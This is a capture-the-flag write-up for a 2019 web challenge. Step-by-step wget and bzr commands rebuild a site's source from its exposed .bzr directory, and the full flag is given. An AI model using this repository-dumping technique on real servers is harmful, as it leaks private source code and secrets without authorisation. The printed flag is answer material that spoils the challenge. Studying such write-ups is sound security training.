# STEM CTF Cyber Challenge 2019 – My First Blog

* **Category:** Web
* **Points:** 150

## Challenge

> I wish canonical would release a blog platform, they make everything so easy to use and it just works!
> 
> http://138.247.13.106/

## Solution

The owner of the blog is a fan of Canonical and its products. As you can see in the blog, he is fan of [Bazaar](http://bazaar.canonical.com/en/), the version control system of Canonical.

Trying to connect to `http://138.247.13.106/.bzr/` will give an `HTTP 403 Forbidden` error, so the folder should exist.

Connecting to `http://138.247.13.106/.bzr/README` will reveal the existence of a Bazaar repository folder.

Furthermore, connecting to `http://138.247.13.106/.bzr/branch/last-revision`, will reveal the last revision.

```
1 bzr_lover-20181206184825-790ppqxy6l69f581
```

So Bazaar must be installed and a `bzr` repostitory must be created in order to craft the `.bzr` directory and then recreate the website files.

```
$ mkdir ctf-bzr
$ cd ctf-bzr/
$ bzr init
$ echo 'foo' > foo.txt
$ bzr add
$ bzr commit
$ rm foo.txt
```

The `last-revision` can be downloaded to replace the existing one.

```
$ cd .bzr/branch
$ rm last-revision
$ wget http://138.247.13.106/.bzr/branch/last-revision
```

The `dirstate` file can be downloaded to replace the existing one.

```
$ cd ../checkout
$ rm dirstate
$ wget http://138.247.13.106/.bzr/checkout/dirstate
```

The `pack-names` file can be downloaded replacing the existing one.

```
$ cd ../repository
$ rm pack-names
$ wget http://138.247.13.106/.bzr/repository/pack-names
```

Using `bzr check` command will trigger an error that will reveal the name of the missing files.

```
$ cd ../../
$ bzr check
```

The name is: `ctf-bzr/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.rix`, so all missing files can be downloaded.

```
$ cd .bzr/repository/indices/
$ rm *.*
$ wget http://138.247.13.106/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.rix
$ wget http://138.247.13.106/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.cix
$ wget http://138.247.13.106/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.iix
$ wget http://138.247.13.106/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.six
$ wget http://138.247.13.106/.bzr/repository/indices/c325a543411b3717bd63b6cc879e3d50.tix
$ cd ../packs
$ rm *.pack
$ wget http://138.247.13.106/.bzr/repository/packs/c325a543411b3717bd63b6cc879e3d50.pack
```

Then the status of the repo could be checked.

```
$ bzr status
removed:
  index.php
```

The command `bzr revert` will recreate the file.

```php
<html>
    <head>
        <title>My Blog</title>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" 
crossorigin="anonymous">
    </head>
    <body>

        <div class="container">
        <div class="jumbotron">
            <h1 class="display-4">My Blog</h1>
            <p class="lead">Just a spot for me to talk about how much I love Canonical</p>
        </div>
            <h1>I love Canonical</h1>
            <p>As someone who is just getting started with Linux, I love Canonical. They build the easiest to use Linux distribution I can find, and they build so many useful tools. So far I'v
e tried out</p>
            <ul>
                <li>Juju - The worlds best configuration management tool!</li>
                <li>Bazaar - The worlds best version control!</li>
                <li>Ubuntu - The worlds best OS!</li>
                <li>Launchpad - GitHub? Gross!</li>
            </ul>
            <hr>
            <h1>Learning PHP</h1>
            <p>I recently learned about PHP and I can't stop switching everything over to it. In fact, this blog is now powered by PHP, I think! I changed the file extension at least, and adde
d a little PHP code below here. That should pretty much do it right? I have the PHP code commented out for now since I can't seem to get it to work right. I'll have to look into it later.</p>
            <?php
                // Flag is MCA{canonical_is_literally_my_favorite_company_in_the_whole_world}
            ?>
        </div>
    </body>
</html>
```

It will contain the flag.

```
MCA{canonical_is_literally_my_favorite_company_in_the_whole_world}
```